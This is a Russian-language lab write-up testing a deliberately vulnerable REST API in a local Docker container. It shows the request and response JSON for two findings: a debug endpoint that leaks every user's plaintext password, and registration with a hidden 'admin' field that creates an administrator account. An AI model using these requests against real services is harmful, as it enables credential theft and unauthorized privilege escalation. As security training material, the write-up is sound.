## REST API Vulnerabilities

### Запущу образ
docker run -d --name "otus_rest_1" -p 8080:8080 ket9/otus-devsecops-owasp-rest:latest

### Посмотрю функционал приложения
http://localhost:8080/

### Доступный функционал

```json
{
	"создать базу": "/createdb",
	"посмотреть информацию обо всех пользователях": "/users/v1",
	"посмотреть подробную информацию обо всех пользователях": "/users/v1/_debug",
	"регистрация нового пользователя": "/users/v1/register (HTTP POST)",
	"вход в приложение": "/users/v1/login (HTTP POST)",
	"просмотр пользователя по имени": "/users/v1/{username}",
	"удалить пользователя по имени (только для админов)": "/users/v1/{username} (HTTP DELETE)",
	"изменить email пользователя": "/users/v1/{username}/email (HTTP PUT)",
	"изменить пароль пользователя": "/users/v1/{username}/password (HTTP PUT)",
	"все книги": "/books/v1",
	"добавить книгу": "/books/v1 (HTTP POST)",
	"просмотр книги": "/books/v1/{book}"
}
```

### Выполню команду для создания БД
http://localhost:8080/createdb

Получен ответ от сервера
```json
{
	"message": "Database populated."
}
```

### Изучу остальные команды

По адресу http://localhost:8080/users/v1 получаю массив зарегистрированных пользоваталей:

```json
{
	"users":
	[
		{"email":"mail1@mail.com","username":"name1"},
		{"email":"mail2@mail.com","username":"name2"},
		{"email":"admin@mail.com","username":"admin"}
	]
}
```

Попробую зарегистрировать парользователя (воспользуюсь Insomnia):

Из предыдущего запроса известно, что у пользователя точно есть свойства:
<br/>email, username.

Попробую зарегистрировать пользователя (запросы POST)
<br/>http://localhost:8080/users/v1/register

Запрос 1. Заполню свойства 'username', 'email'
```json
{
	"username": "user100",
	"email": "email@email.email"
}
```

Ответ 1. Отсутствует обязательное свойство 'password'
```json
{
	"status": "fail",
	"message": "'password' is a required property"
}
```

Запрос 2. Заполню свойства 'username', 'password', 'email'
```json
{
	"username": "user100",
	"password": "password100",
	"email": "email@email.email"
	
}
```

Ответ 2. Все необходимые свойства заполнены. Пользователь создан
```json
{
	"message": "Successfully registered. Login to receive an auth token.",
	"status": "success"
}
```

Выполню запрос (GET), информацию "отладки":
<br/>- http://localhost:8080/users/v1/_debug

```json
{
	"users":
	[
		{"admin":false,"email":"mail1@mail.com","password":"pass1","username":"name1"},
		{"admin":false,"email":"mail2@mail.com","password":"pass2","username":"name2"},
		{"admin":true,"email":"admin@mail.com","password":"pass1","username":"admin"},
		{"admin":false,"email":"email@email.email","password":"password100","username":"user100"}
	]
}
```
<br/>Информативно. Получен список пользователей с раскрытыми учетных данных пользователей
<br/>Помимо этого у пользователя есть скрытое свойство 'admin'

Запрос 3. Создам новую учетную запись (запрос POST), добавив свойство 'admin' со значением 'True'
```json
{
	"username": "user101",
	"password": "password101",
	"email": "email1@email.email",
	"admin": "True"
}
```

Ответ 3. Пользователь создан
```json
{
	"message": "Successfully registered. Login to receive an auth token.",
	"status": "success"
}
```
Выполню запрос (GET), информацию "отладки" повторно:
<br/>- http://localhost:8080/users/v1/_debug

```json
{
	"users":
	[
		{"admin":false,"email":"mail1@mail.com","password":"pass1","username":"name1"},
		{"admin":false,"email":"mail2@mail.com","password":"pass2","username":"name2"},
		{"admin":true,"email":"admin@mail.com","password":"pass1","username":"admin"},
		{"admin":false,"email":"email@email.email","password":"password100","username":"user100"},
		{"admin":true,"email":"email1@email.email","password":"password101","username":"user101"}
	]
}
```

<br/>Учетная запись создана с правами администратора

### Найденные уязвимости

|#|Описание|Код|
|-|-|-|
|1|Раскрытие данных пользователей по адресу<br/>http://localhost:8080/users/v1/_debug|API3:2019 Excessive Data Exposure|
|2|Возможно создать администратора, заполнив скрытое свойство 'admin'<br/>http://localhost:8080/users/v1/register|API5:2019 Broken Function Level Authorization|